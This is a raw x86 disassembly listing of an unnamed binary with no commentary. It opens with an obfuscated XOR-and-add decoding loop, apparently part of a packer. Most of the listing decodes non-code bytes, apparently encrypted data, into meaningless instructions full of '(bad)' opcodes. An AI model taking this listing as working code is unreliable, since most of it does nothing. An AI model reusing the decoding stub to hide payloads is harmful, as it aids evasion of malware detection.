  4103e1:	and    DWORD PTR ds:0x433657,0x0
  4103eb:	jmp    0x4103ff
  4103f0:	xor    esi,esi
  4103f2:	add    esi,DWORD PTR ds:0x433657
  4103f8:	inc    esi
  4103f9:	mov    DWORD PTR ds:0x433657,esi
  4103ff:	cmp    DWORD PTR ds:0x433657,0x1d
  410406:	jae    0x410427
  41040c:	cmp    DWORD PTR ds:0x433657,0x26
  410413:	jne    0x410422
  410419:	push   DWORD PTR [ebp-0x24]
  41041c:	call   DWORD PTR ds:0x4122b4
  410422:	jmp    0x4103f0
  410427:	xor    eax,ecx
  410429:	mov    esi,0x32729b
  41042e:	add    eax,esi
  410430:	jmp    0x41043d
  410435:	mov    dl,BYTE PTR [ebp-0x1]
  410438:	mov    BYTE PTR [ebp+eax*1-0x58],dl
  41043c:	inc    eax
  41043d:	cmp    eax,0x40
  410440:	jb     0x410435
  410446:	mov    edx,DWORD PTR [ebp-0x8]
  410449:	mov    eax,DWORD PTR [ebp-0xc]
  41044c:	xor    edx,ecx
  41044e:	add    edx,esi
  410450:	cmp    edx,eax
  410452:	je     0x410766
  410458:	push   ebx
  410459:	push   edi
  41045a:	mov    edi,DWORD PTR [ebp+0x8]
  41045d:	mov    eax,0x8a3c
  410462:	xor    ax,WORD PTR [edi+edx*4+0x2]
  410467:	mov    edi,0x3b02
  41046c:	add    ax,di
  41046f:	movzx  eax,ax
  410472:	mov    DWORD PTR [ebp-0x14],eax
  410475:	mov    eax,DWORD PTR [ebp+0x8]
  410478:	movzx  eax,WORD PTR [eax+edx*4]
  41047c:	xor    eax,0x8a3c
  410481:	add    eax,edi
  410483:	mov    edi,DWORD PTR [ebp-0x14]
  410486:	mov    BYTE PTR [ebp+edi*1-0x58],al
  41048a:	jmp    0x410758
  41048f:	cdq    
  410490:	outs   dx,BYTE PTR ds:[esi]
  410491:	mov    ds:0xa1f17118,eax
  410496:	outs   dx,DWORD PTR ds:[esi]
  410497:	or     BYTE PTR [edx],bl
  410499:	push   es
  41049a:	out    0xe1,al
  41049c:	cs ret 
  41049e:	sub    ebx,esp
  4104a0:	mov    al,0x7e
  4104a2:	jle    0x410453
  4104a4:	jl     0x410524
  4104a6:	jle    0x4104e7
  4104a8:	inc    ebx
  4104a9:	(bad)  
  4104aa:	cmc    
  4104ab:	mov    dh,0x98
  4104ad:	mov    edx,edi
  4104af:	sbb    DWORD PTR [ebx-0x4fe0b8ed],0x6531d413
  4104b9:	mov    ah,0x68
  4104bb:	mov    esi,0xedb556e
  4104c0:	int    0x73
  4104c2:	adc    eax,0xadad1d26
  4104c7:	nop
  4104c8:	lock jl 0x4104af
  4104cb:	xchg   ch,al
  4104cd:	add    DWORD PTR [esi+0x56],edx
  4104d0:	pop    ss
  4104d1:	mov    ecx,0xd4286dc5
  4104d6:	mov    dh,0x6a
  4104d8:	cmp    eax,0x89c71f29
  4104dd:	mov    ah,0x2c
  4104df:	xlat   BYTE PTR ds:[ebx]
  4104e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4104e1:	adc    DWORD PTR [ecx],eax
  4104e3:	test   BYTE PTR [esi+0x79],al
  4104e6:	adc    ch,BYTE PTR [edi-0x3a7ba877]
  4104ec:	jp     0x41053c
  4104ee:	repnz inc edx
  4104f0:	adc    al,0xde
  4104f2:	cmp    ah,0x74
  4104f5:	retf   
  4104f6:	sub    eax,0xf726783f
  4104fb:	(bad)  
  4104fc:	and    esp,edx
  4104fe:	dec    esi
  4104ff:	push   0xffffffce
  410501:	push   esi
  410502:	or     ah,BYTE PTR [eax]
  410504:	xchg   ebx,ecx
  410506:	pop    ebp
  410507:	or     edi,0xffffff80
  41050a:	ret    
  41050b:	aaa    
  41050c:	add    edi,DWORD PTR [edx+edx*1+0x5db3c020]
  410513:	das    
  410514:	shr    DWORD PTR [ebx+0x5e],cl
  410517:	mov    ebp,0x9f6db16
  41051c:	bound  esi,QWORD PTR [ebp+0x3c1b07f2]
  410522:	push   0x216306be
  410527:	js     0x41054b
  410529:	xchg   esi,eax
  41052a:	cli    
  41052b:	stc    
  41052c:	pop    esi
  41052d:	mov    ah,0x77
  41052f:	pop    edi
  410530:	dec    ebx
  410531:	(bad)  
  410533:	loopne 0x4104ec
  410535:	dec    ecx
  410536:	xlat   BYTE PTR ds:[ebx]
  410537:	sub    al,bl
  410539:	pop    ds
  41053a:	inc    esi
  41053b:	mov    bl,0xc8
  41053d:	int    0xf2
  41053f:	das    
  410540:	xchg   esp,eax
  410541:	mov    cl,0x9b
  410543:	jbe    0x410533
  410545:	jge    0x410512
  410547:	lods   eax,DWORD PTR ds:[esi]
  410548:	ror    BYTE PTR [edi+0x28],cl
  41054b:	ins    DWORD PTR es:[edi],dx
  41054c:	mov    BYTE PTR [ebx-0x2c],ah
  41054f:	fisubr WORD PTR [ecx]
  410551:	jo     0x410535
  410553:	loop   0x41051a
  410555:	outs   dx,DWORD PTR ds:[esi]
  410556:	into   
  410557:	adc    ebx,DWORD PTR [esi+ebp*8-0x543a6438]
  41055e:	and    bl,BYTE PTR [esi]
  410560:	dec    edi
  410561:	imul   ebx,DWORD PTR [eax+0x37],0x822019e4
  410568:	test   al,0x6f
  41056a:	xor    eax,ecx
  41056c:	enter  0xaa10,0x58
  410570:	xor    ebx,DWORD PTR [ebx+0x2e]
  410573:	inc    edi
  410574:	add    BYTE PTR [ebp+0x32],0x74
  410578:	inc    ebx
  410579:	pop    eax
  41057a:	fwait
  41057b:	enter  0xf596,0xe6
  41057f:	xor    BYTE PTR [ebx-0x4a],dh
  410582:	(bad)  
  410583:	mov    ebx,0x75569dab
  410588:	adc    BYTE PTR [esi],dl
  41058a:	mov    ecx,0x1708d53
  41058f:	int3   
  410590:	push   ds
  410591:	jle    0x41057d
  410593:	mov    esp,DWORD PTR [esp+ebp*2]
  410596:	outs   dx,BYTE PTR ds:[esi]
  410597:	or     esp,0xffffffa2
  41059a:	dec    esi
  41059b:	std    
  41059c:	(bad)  
  41059d:	xchg   edx,eax
  41059e:	leave  
  41059f:	push   eax
  4105a0:	adc    bl,bl
  4105a2:	dec    edx
  4105a3:	jo     0x410616
  4105a5:	push   0xffffffba
  4105a7:	sahf   
  4105a8:	mov    edx,0x643531f5
  4105ad:	add    eax,esp
  4105af:	lahf   
  4105b0:	fidivr DWORD PTR [edi]
  4105b2:	and    ah,BYTE PTR [ebx+0x36]
  4105b5:	jnp    0x410608
  4105b7:	(bad)  
  4105b8:	mov    eax,0xe6b6e5d8
  4105bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4105be:	dec    ebp
  4105bf:	(bad)
  4105c3:	mov    esp,0x4003d7ad
  4105c8:	add    eax,DWORD PTR [esp+eiz*2]
  4105cb:	and    eax,0x9aade7b9
  4105d0:	inc    eax
  4105d1:	int    0x5b
  4105d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4105d4:	xchg   esi,eax
  4105d5:	or     ebp,DWORD PTR [edx-0x4d]
  4105d8:	cwde   
  4105d9:	inc    ebx
  4105da:	xchg   ebx,eax
  4105db:	push   0x7597d92
  4105e0:	push   ebp
  4105e1:	imul   ecx,DWORD PTR [edx+eiz*1-0xbdd0869],0x31bc9b77
  4105ec:	retf   
  4105ed:	rcl    ch,0xaf
  4105f0:	dec    ebp
  4105f1:	aas    
  4105f2:	mov    ebx,0x6dc79cf0
  4105f7:	dec    ecx
  4105f8:	adc    al,0x16
  4105fa:	adc    DWORD PTR [esi+0xe44d83a],0xffffffa4
  410601:	cmp    BYTE PTR [ebp-0x45adf04a],0x50
  410608:	mov    bh,0xf9
  41060a:	xor    esi,DWORD PTR ss:[ecx]
  41060d:	mov    bh,0x75
  41060f:	mul    DWORD PTR [ecx+0x5e]
  410612:	dec    eax
  410613:	shl    WORD PTR [esi],1
  410616:	push   edx
  410617:	sbb    ch,BYTE PTR [edi-0x1]
  41061a:	shr    DWORD PTR [eax+eiz*2+0x6703ee1f],0x68
  410622:	xor    al,0xb0
  410624:	or     BYTE PTR [edi+ebp*1],0xb
  410628:	pushf  
  410629:	aas    
  41062a:	adc    bh,BYTE PTR [edx-0x32207856]
  410630:	cli    
  410631:	stc    
  410632:	retf   
  410633:	jge    0x410682
  410635:	in     eax,dx
  410636:	adc    ebx,esp
  410638:	imul   ebx,eax,0xdbd0a277
  41063e:	and    al,0x68
  410640:	or     DWORD PTR [edi-0x5c],ecx
  410643:	inc    ecx
  410644:	sahf   
  410645:	rcl    DWORD PTR [ebx],0x5f
  410648:	iret   
  410649:	fldcw  WORD PTR [edi+0x29]
  41064c:	inc    ecx
  41064d:	es in  eax,dx
  41064f:	lahf   
  410650:	scas   eax,DWORD PTR es:[edi]
  410651:	xchg   al,bl
  410653:	and    BYTE PTR [eax],0x2b
  410656:	int    0xd9
  410658:	pushf  
  410659:	fst    QWORD PTR [eax]
  41065b:	add    al,0x92
  41065d:	dec    edi
  41065e:	jb     0x41062f
  410660:	into   
  410661:	sbb    ch,BYTE PTR [edi]
  410663:	mov    dl,BYTE PTR [ebx+0x6577f424]
  410669:	mov    ds:0x22a2b989,eax
  41066e:	xor    al,0xe3
  410670:	push   ebp
  410671:	dec    BYTE PTR [ebx+0x6a84b036]
  410677:	push   ss
  410678:	xchg   ebp,eax
  410679:	fdivrp st(0),st
  41067b:	test   BYTE PTR [edi],ah
  41067d:	inc    ebx
  41067e:	mov    bh,0x92
  410680:	les    ecx,FWORD PTR [edi-0x36]
  410683:	push   ecx
  410684:	je     0x410620
  410686:	push   esi
  410687:	inc    DWORD PTR [eax]
  410689:	xchg   edx,eax
  41068a:	aas    
  41068b:	xchg   esp,eax
  41068c:	outs   dx,DWORD PTR ds:[esi]
  41068d:	je     0x4106e0
  41068f:	pop    ecx
  410690:	mov    al,0x46
  410692:	inc    edx
  410693:	in     eax,dx
  410694:	sahf   
  410695:	leave  
  410696:	mov    edi,0x922ca378
  41069b:	or     DWORD PTR [ebx+0x55500633],ecx
  4106a1:	mov    dh,0x21
  4106a3:	cmc    
  4106a4:	sahf   
  4106a5:	mov    ebx,0x9461858e
  4106aa:	test   BYTE PTR [edi-0x13],ah
  4106ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4106ae:	leave  
  4106af:	gs push 0xffffffbd
  4106b2:	(bad)  
  4106b3:	fld    TBYTE PTR [ecx-0x42]
  4106b6:	sbb    ch,bh
  4106b8:	dec    ecx
  4106b9:	jnp    0x41067b
  4106bb:	jae    0x410644
  4106bd:	stos   BYTE PTR es:[edi],al
  4106be:	stc    
  4106bf:	sub    al,0x1e
  4106c1:	mov    edi,0xe007326c
  4106c6:	jb     0x410698
  4106c8:	dec    ebx
  4106c9:	mov    ds:0xc9f0f4a9,eax
  4106ce:	sub    DWORD PTR [esi],ebx
  4106d0:	inc    edi
  4106d1:	or     BYTE PTR [ebx],cl
  4106d3:	inc    ebp
  4106d4:	(bad)  
  4106d5:	ins    BYTE PTR es:[edi],dx
  4106d6:	scas   eax,DWORD PTR es:[edi]
  4106d7:	pop    edi
  4106d8:	retf   0xbcdc
  4106db:	sub    DWORD PTR [eax+0xc],esi
  4106de:	icebp  
  4106df:	je     0x41071f
  4106e1:	sar    BYTE PTR [ecx],0xaa
  4106e4:	inc    esp
  4106e5:	pop    eax
  4106e6:	sbb    dh,bl
  4106e8:	addr16 in eax,0xe8
  4106eb:	repz xchg esp,eax
  4106ed:	ja     0x41067c
  4106ef:	pop    ecx
  4106f0:	pushf  
  4106f1:	data16 fimul DWORD PTR [esi+0x4]
  4106f5:	pop    edx
  4106f6:	mov    eax,0x40462ed6
  4106fb:	cmp    BYTE PTR [edx-0x72b1d28],dh
  410701:	arpl   dx,bp
  410703:	mov    bl,0xbf
  410705:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410706:	fcomp  DWORD PTR [edx+0x3e]
  410709:	inc    edx
  41070a:	inc    esp
  41070b:	int3   
  41070c:	xchg   edx,eax
  41070d:	addr16 inc sp
  410710:	int3   
  410711:	into   
  410712:	sbb    esp,DWORD PTR [edx]
  410714:	leave  
  410715:	jecxz  0x410785
  410717:	popa   
  410718:	cmp    BYTE PTR [edi-0x65],bh
  41071b:	cmp    eax,0xf521f7c1
  410720:	pushf  
  410721:	lea    ebx,[ebx+0x3a]
  410724:	lahf   
  410725:	jg     0x410728
  410727:	dec    ebx
  410728:	jb     0x410731
  41072a:	(bad)  
  41072b:	sbb    eax,ebp
  41072d:	add    eax,0xfcba29e2
  410732:	add    ah,bh
  410734:	pop    ebp
  410735:	push   ds
  410736:	outs   dx,BYTE PTR ds:[esi]
  410737:	ret    
  410738:	fst    DWORD PTR [esi+0x6b]
  41073b:	js     0x4106d3
  41073d:	cmp    DWORD PTR [edx+0x2b],esp
  410740:	icebp  
  410741:	sbb    eax,ebx
  410743:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410744:	test   eax,0xc7dd7bb2
  410749:	(bad)  [esi]
  41074b:	push   cs
  41074c:	mov    ch,BYTE PTR [edx]
  41074e:	fnstenv [eax+0x421048ff]
  410754:	push   ecx
  410755:	sbb    eax,DWORD PTR [eax+0x6d]
  410758:	mov    eax,DWORD PTR [ebp-0xc]
  41075b:	inc    edx
  41075c:	cmp    edx,eax
  41075e:	jne    0x41045a
  410764:	pop    edi
  410765:	pop    ebx
  410766:	mov    eax,DWORD PTR [ebp-0x8]
  410769:	mov    edx,DWORD PTR [ebp+0x10]
  41076c:	xor    eax,ecx
  41076e:	jmp    0x410a3c
  410773:	mov    ds:0x6929ab51,eax
  410778:	icebp  
  410779:	mov    eax,ds:0x2251d751
  41077e:	and    eax,0x87a928da
  410783:	or     eax,0xaf7e7ebf
  410788:	jl     0x410808
  41078a:	jle    0x410785
  41078c:	bound  ecx,QWORD PTR [edx-0x496d2daa]
  410792:	pop    ebx
  410793:	fld    QWORD PTR [ecx-0xe5d83db]
  410799:	push   ss
  41079a:	popf   
  41079b:	or     edx,esp
  41079d:	sub    DWORD PTR [edx+0x15],edi
  4107a0:	cmp    ah,BYTE PTR [edx]
  4107a2:	(bad)  
  4107a3:	in     eax,0x13
  4107a5:	xor    al,0xdf
  4107a7:	pop    ss
  4107a8:	and    cl,BYTE PTR [ebx+0x5f]
  4107ab:	push   es
  4107ac:	in     al,dx
  4107ad:	pop    edx
  4107ae:	repnz (bad) 
  4107b0:	jl     0x41079a
  4107b2:	stos   BYTE PTR es:[edi],al
  4107b3:	adc    eax,0xc3ccfc6e
  4107b8:	pop    ecx
  4107b9:	jecxz  0x4107db
  4107bb:	xchg   esi,eax
  4107bc:	xchg   ebp,eax
  4107bd:	cmp    DWORD PTR ds:0xb48f1ba6,esp
  4107c3:	push   edi
  4107c4:	js     0x410750
  4107c6:	inc    ebp
  4107c7:	popa   
  4107c8:	mov    ecx,esp
  4107ca:	loop   0x410802
  4107cc:	ins    BYTE PTR es:[edi],dx
  4107cd:	fdiv   st(7),st
  4107cf:	push   esp
  4107d0:	leave  
  4107d1:	add    BYTE PTR ds:0xe13c4f1a,0x41
  4107d8:	xchg   edx,eax
  4107d9:	push   es
  4107da:	xchg   esp,eax
  4107db:	std    
  4107dc:	cld    
  4107dd:	lock pop ds
  4107df:	in     eax,dx
  4107e0:	adc    BYTE PTR [edi-0x6],cl
  4107e3:	fdivr  QWORD PTR [ebx]
  4107e5:	push   ecx
  4107e6:	inc    edx
  4107e7:	loopne 0x410859
  4107e9:	jl     0x410803
  4107eb:	stos   DWORD PTR es:[edi],eax
  4107ec:	daa    
  4107ed:	add    eax,0x9d8cecc1
  4107f2:	xchg   ebp,eax
  4107f3:	test   al,0x5d
  4107f5:	pop    ecx
  4107f6:	lds    esp,FWORD PTR [eax+0xf5665a6]
  4107fc:	cs repz mov edx,0x104854c8
  410803:	arpl   dx,ax
  410805:	add    eax,0xbc96828b
  41080a:	inc    ecx
  41080b:	and    BYTE PTR [edi],dh
  41080d:	xchg   ecx,eax
  41080e:	std    
  41080f:	dec    eax
  410810:	addr16 rdtsc 
  410813:	push   esp
  410814:	adc    ecx,ecx
  410816:	jge    0x4107b2
  410818:	dec    esp
  410819:	fwait
  41081a:	je     0x4107fb
  41081c:	lods   al,BYTE PTR ds:[esi]
  41081d:	test   esp,esp
  41081f:	cwde   
  410820:	int    0xce
  410822:	sbb    edx,edx
  410824:	dec    ecx
  410825:	nop
  410826:	aas    
  410827:	pop    edi
  410828:	mov    al,ds:0xe873ad44
  41082d:	and    bl,al
  41082f:	int    0xa0
  410831:	test   al,0xec
  410833:	jl     0x4107e9
  410835:	mov    ah,0x4b
  410837:	cmp    dl,ah
  410839:	ds pop ss
  41083b:	sahf   
  41083c:	xor    al,BYTE PTR [edi+0x4a]
  41083f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410840:	inc    ecx
  410841:	mov    cl,0x86
  410843:	outs   dx,DWORD PTR ds:[esi]
  410844:	cmc    
  410845:	jbe    0x4107d9
  410847:	pop    ebx
  410848:	pop    edx
  410849:	in     al,0xd1
  41084b:	jns    0x4107e7
  41084d:	dec    ebp
  41084e:	ins    DWORD PTR es:[edi],dx
  41084f:	mov    ds:0x7c2f3172,eax
  410854:	cld    
  410855:	arpl   bp,di
  410857:	mov    ds:0x5f837056,al
  41085c:	dec    eax
  41085d:	or     eax,ecx
  41085f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410860:	push   ecx
  410861:	rcl    cl,cl
  410863:	xchg   DWORD PTR [eax+0x20],esi
  410866:	jl     0x4108cb
  410868:	push   es
  410869:	xor    ah,BYTE PTR [ecx]
  41086b:	jmp    0x410840
  41086d:	jmp    0x4108c3
  41086f:	std    
  410870:	retf   
  410871:	das    
  410872:	imul   esp,edi,0x7686f089
  410878:	xor    BYTE PTR [edx],0x2c
  41087b:	sti    
  41087c:	jnp    0x410890
  41087e:	es pop esi
  410880:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410881:	pusha  
  410882:	and    al,0xd1
  410884:	xchg   edi,eax
  410885:	test   ch,dl
  410887:	pop    ds
  410888:	add    DWORD PTR fs:[ebx],edi
  41088b:	ds clc 
  41088d:	mov    dl,0x9e
  41088f:	ds pop es
  410891:	jbe    0x410831
  410893:	mov    eax,ds:0x78ef8a5e
  410898:	adc    DWORD PTR [edx+0x55],ecx
  41089b:	aam    0x9e
  41089d:	push   ebp
  41089e:	fcmovne st,st(5)
  4108a0:	mov    ds:0x8afbf48c,eax
  4108a5:	add    DWORD PTR [ebx],ecx
  4108a7:	ins    BYTE PTR es:[edi],dx
  4108a8:	ins    BYTE PTR es:[edi],dx
  4108a9:	xor    dh,BYTE PTR [eax+0x34]
  4108ac:	pop    ecx
  4108ad:	js     0x41090d
  4108af:	xchg   BYTE PTR [ebp+0x39b2d55d],bl
  4108b5:	add    DWORD PTR [ecx+0x2d226556],esi
  4108bb:	arpl   WORD PTR [ebx-0x722640b8],di
  4108c1:	dec    DWORD PTR [edi+0x43]
  4108c4:	imul   ebx,DWORD PTR [esp+eax*1-0x11],0x6d
  4108c9:	aaa    
  4108ca:	add    al,0x48
  4108cc:	or     al,BYTE PTR [ebx+0x20]
  4108cf:	jb     0x4108e1
  4108d1:	imul   ecx,DWORD PTR [edx],0x37
  4108d4:	pop    ebp
  4108d5:	and    al,0x89
  4108d7:	pusha  
  4108d8:	arpl   WORD PTR [edi],ax
  4108da:	add    eax,eax
  4108dc:	repz or bl,bl
  4108df:	push   0x20
  4108e1:	mov    ebp,0x217108d8
  4108e6:	xchg   ecx,eax
  4108e7:	cmp    ebx,DWORD PTR ds:0x6159bdb0
  4108ed:	fcomp  DWORD PTR [ecx-0x7ce8d2d5]
  4108f3:	in     al,0x48
  4108f5:	rol    ch,1
  4108f7:	scas   eax,DWORD PTR es:[edi]
  4108f8:	cmp    al,0x2d
  4108fa:	or     BYTE PTR [edi+0x3b],cl
  4108fd:	adc    esi,DWORD PTR [ebp-0x39]
  410900:	scas   al,BYTE PTR es:[edi]
  410901:	or     dl,0xd3
  410904:	in     eax,dx
  410905:	pop    ecx
  410906:	or     bl,cl
  410908:	cmp    BYTE PTR [ecx-0x34],ah
  41090b:	bound  ecx,QWORD PTR [edi-0x476fcdb2]
  410911:	popa   
  410912:	ja     0x41097f
  410914:	or     al,ah
  410916:	sbb    ebx,DWORD PTR [esi+0x24]
  410919:	pop    esi
  41091a:	inc    edi
  41091b:	(bad)  
  41091c:	cmp    ah,BYTE PTR [eax]
  41091e:	call   0x16915e7c
  410923:	push   cs
  410924:	inc    ecx
  410925:	add    bh,dh
  410927:	mov    dh,0x31
  410929:	lods   al,BYTE PTR ds:[esi]
  41092a:	fsub   QWORD PTR [esi*2+0x565409d2]
  410931:	xchg   esi,eax
  410932:	jmp    0xfd309ebe
  410937:	sbb    dl,ah
  410939:	mov    ebp,0xeb71686b
  41093e:	fcom   st(5)
  410940:	pop    edi
  410941:	mov    edx,0x6d3c68ab
  410946:	ja     0x41093d
  410948:	inc    ebp
  410949:	test   BYTE PTR [esi+0x4eea8e21],al
  41094f:	ds clc 
  410951:	jmp    0x5ce6:0x7bbd9f85
  410958:	mov    ss,edx
  41095a:	jp     0x4109c2
  41095c:	mov    ebx,0x18d676a5
  410962:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410963:	push   edi
  410964:	retf   
  410965:	push   edx
  410966:	mov    esi,0xaebd8f4d
  41096b:	sub    al,0xbd
  41096d:	xchg   dl,cl
  41096f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410970:	mov    eax,ds:0xb89dc536
  410975:	mov    ds:0x98cbbcb0,eax
  41097a:	std    
  41097b:	fst    QWORD PTR ds:0x48287c0f
  410981:	arpl   WORD PTR [ebx],sp
  410983:	inc    ebp
  410984:	mov    edi,0x819969b
  410989:	mov    dl,al
  41098b:	cmp    ch,al
  41098d:	fdiv   QWORD PTR [ebx+0x73c05551]
  410993:	ret    
  410994:	cli    
  410995:	popa   
  410996:	dec    edx
  410998:	or     esp,DWORD PTR [eax+0x1f]
  41099b:	sbb    eax,0xe52b5fd8
  4109a0:	xchg   ebp,eax
  4109a1:	nop
  4109a2:	fstp   TBYTE PTR [ebx+0x638b1a92]
  4109a8:	fsub   DWORD PTR [edx-0x55]
  4109ab:	pop    edx
  4109ac:	bound  edi,QWORD PTR [edx]
  4109ae:	mov    DWORD PTR [ebx+0x1c3d0192],esi
  4109b4:	jecxz  0x410a2a
  4109b6:	xor    al,0x4d
  4109b8:	enter  0x6eec,0x3a
  4109bc:	xor    DWORD PTR [edi],ebx
  4109be:	xor    esi,esp
  4109c0:	stc    
  4109c1:	cmp    dh,al
  4109c3:	sub    ebx,DWORD PTR [eax-0x45]
  4109c6:	sar    BYTE PTR [ebp-0x8],cl
  4109c9:	fiadd  WORD PTR [ebx+0x3b]
  4109cc:	stos   DWORD PTR es:[edi],eax
  4109cd:	xchg   esp,ebp
  4109cf:	push   esi
  4109d0:	xchg   ebx,eax
  4109d1:	or     ah,BYTE PTR [ecx-0x395fcb68]
  4109d7:	xchg   BYTE PTR [esi],ch
  4109d9:	mov    ebp,0x6de7d7f5
  4109de:	or     esi,DWORD PTR ds:0x604203c6
  4109e4:	mov    dh,0x49
  4109e6:	sti    
  4109e7:	mov    gs,WORD PTR [esi+0x58]
  4109ea:	sbb    ch,dh
  4109ec:	js     0x4109cf
  4109ee:	add    al,0xcc
  4109f0:	imul   eax,DWORD PTR ds:0xf8b61c20,0xffffff96
  4109f7:	sub    BYTE PTR [eax],bl
  4109f9:	cwde   
  4109fa:	mov    dl,0x6f
  4109fc:	nop
  4109fd:	aad    0x6c
  4109ff:	and    bl,dh
  410a01:	jb     0x410a5e
  410a03:	mov    ds:0xd81ceef0,eax
  410a08:	dec    ecx
  410a09:	adc    bh,BYTE PTR [edi+ebx*8+0x18]
  410a0d:	test   DWORD PTR [ebx+0x5f5743b0],esi
  410a13:	xor    DWORD PTR [edx],edx
  410a15:	(bad)
  410a18:	or     ecx,DWORD PTR [ebx+0x38]
  410a1b:	and    al,0x19
  410a1d:	and    edi,DWORD PTR [ecx-0x3f]
  410a20:	sti    
  410a21:	sub    eax,0x38afaa99
  410a26:	dec    edx
  410a27:	(bad)  
  410a28:	aad    0xc6
  410a2a:	jg     0x410a11
  410a2c:	cmp    DWORD PTR [esp+ecx*2],edx
  410a2f:	mov    bl,0x53
  410a31:	dec    ecx
  410a32:	xchg   ebx,eax
  410a33:	mov    edx,0x94302a70
  410a38:	cmp    bl,BYTE PTR [ebx+0x31]
  410a3b:	inc    DWORD PTR [ebx]
  410a3d:	(bad)  
  410a3e:	jmp    0x410d0c
  410a43:	add    dh,BYTE PTR [edx]
  410a45:	fdiv   QWORD PTR fs:[eax+ebp*2-0x7e]
  410a4a:	lock pop eax
  410a4c:	(bad)  
  410a4d:	xchg   esp,eax
  410a4e:	pop    esi
  410a4f:	xchg   esi,eax
  410a50:	sahf   
  410a51:	enter  0xbaf7,0xbd
  410a55:	jle    0x410ad5
  410a57:	scas   eax,DWORD PTR es:[edi]
  410a58:	jl     0x410ad8
  410a5a:	jle    0x410a6e
  410a5c:	and    eax,0xce1139fd
  410a61:	jle    0x410ac4
  410a63:	pop    esi
  410a64:	xor    al,0x65
  410a66:	push   cs
  410a67:	or     dh,al
  410a69:	mov    bl,0x94
  410a6b:	int    0x53
  410a6d:	add    edi,eax
  410a6f:	push   ecx
  410a70:	loope  0x410ad5
  410a72:	mov    es,WORD PTR [ecx+0x70]
  410a75:	inc    esi
  410a76:	mov    dh,BYTE PTR gs:[edi]
  410a79:	cmp    esp,edi
  410a7b:	scas   eax,DWORD PTR es:[edi]
  410a7c:	pushf  
  410a7d:	sub    BYTE PTR [edi+ebx*2],cl
  410a80:	and    eax,0xe4d479b3
  410a85:	xor    DWORD PTR [ecx-0x60],edx
  410a88:	cmp    eax,0x711769a1
  410a8d:	pop    ds
  410a8e:	gs cmc 
  410a90:	and    dl,BYTE PTR [edx+0x3c9760ac]
  410a96:	and    al,0xdc
  410a98:	add    eax,DWORD PTR [esp+ebp*1+0x3a]
  410a9c:	pop    esp
  410a9d:	mov    al,0x8f
  410a9f:	sbb    eax,ebx
  410aa1:	xlat   BYTE PTR ds:[ebx]
  410aa2:	repnz adc ebx,esp
  410aa5:	push   esp
  410aa6:	(bad)  
  410aa7:	sar    DWORD PTR [ebp+0x40],1
  410aaa:	rol    DWORD PTR [edx+0x768f50be],1
  410ab0:	rol    BYTE PTR [ebp-0x7b],cl
  410ab3:	not    DWORD PTR [ebx-0x22]
  410ab6:	loop   0x410b1f
  410ab8:	jno    0x410a51
  410aba:	sbb    bh,dl
  410abc:	adc    DWORD PTR [esi-0x78],edx
  410abf:	jno    0x410a4a
  410ac1:	mov    al,0x66
  410ac3:	mov    ah,0xc3
  410ac5:	sbb    eax,0xe24cb80a
  410aca:	and    al,0x44
  410acc:	ja     0x410aa2
  410ace:	mov    dl,0xac
  410ad0:	ja     0x410b12
  410ad2:	imul   esp,esp,0xfe2a3148
  410ad8:	and    BYTE PTR [ecx-0x2f3e9346],cl
  410ade:	pop    ds
  410adf:	(bad)  
  410ae0:	retf   0x5fb3
  410ae3:	stos   DWORD PTR es:[edi],eax
  410ae4:	or     DWORD PTR [edx-0x71ac5f62],esi
  410aea:	xor    ebx,DWORD PTR [edi]
  410aec:	xchg   BYTE PTR [ebx+ebp*4],ah
  410aef:	test   ecx,esi
  410af1:	outs   dx,BYTE PTR ds:[esi]
  410af2:	(bad)  
  410af3:	test   al,0x65
  410af5:	shr    BYTE PTR [edx],cl
  410af7:	mov    bh,0x52
  410af9:	inc    esi
  410afa:	das    
  410afb:	jecxz  0x410b62
  410afd:	int    0x10
  410aff:	les    esi,FWORD PTR [esi-0x6f10324e]
  410b05:	jno    0x410b5e
  410b07:	mov    al,ds:0xcf783562
  410b0c:	gs pop es
  410b0e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410b0f:	xchg   edi,eax
  410b10:	dec    esp
  410b11:	or     dl,BYTE PTR [edx+0xe]
  410b14:	retf   
  410b15:	jo     0x410ab7
  410b17:	int3   
  410b18:	xor    BYTE PTR [edi+0x7a34258a],bl
  410b1e:	pop    ebp
  410b1f:	gs cmp eax,0xcfc75298
  410b25:	adc    DWORD PTR [edx+ebx*2-0x63165b5d],esi
  410b2c:	not    eax
  410b2e:	mov    edi,0x26e8c074
  410b33:	xchg   esi,eax
  410b34:	adc    bh,ah
  410b36:	(bad)  
  410b37:	stc    
  410b38:	and    edi,DWORD PTR [edi+eax*1]
  410b3b:	fist   DWORD PTR [edi]
  410b3d:	(bad)
  410b40:	push   edi
  410b41:	out    0x8b,al
  410b43:	xor    BYTE PTR [ebx+0x4c],al
  410b46:	into   
  410b47:	stos   DWORD PTR es:[edi],eax
  410b48:	sub    eax,0xe661602c
  410b4d:	pop    edi
  410b4e:	cwde   
  410b4f:	push   0x4c
  410b51:	push   esi
  410b52:	imul   esp,DWORD PTR [ebx-0x49d6135e],0x5ac3b6d2
  410b5c:	in     eax,0x7a
  410b5e:	fldcw  WORD PTR [esi-0x9]
  410b61:	inc    esi
  410b62:	in     eax,dx
  410b63:	inc    esi
  410b64:	imul   ecx,DWORD PTR [edx],0x12
  410b67:	cld    
  410b68:	jno    0x410b6d
  410b6a:	mov    esi,DWORD PTR [ebx]
  410b6c:	lods   eax,DWORD PTR ds:[esi]
  410b6d:	aas    
  410b6e:	cmp    ch,bl
  410b70:	dec    ebp
  410b71:	jb     0x410be1
  410b73:	mov    esi,0x617f3748
  410b78:	fimul  WORD PTR [edi]
  410b7a:	or     edx,DWORD PTR [ebx-0x31b8f423]
  410b80:	mov    eax,DWORD PTR ds:0x84e86644
  410b86:	xor    eax,0x5aa82de1
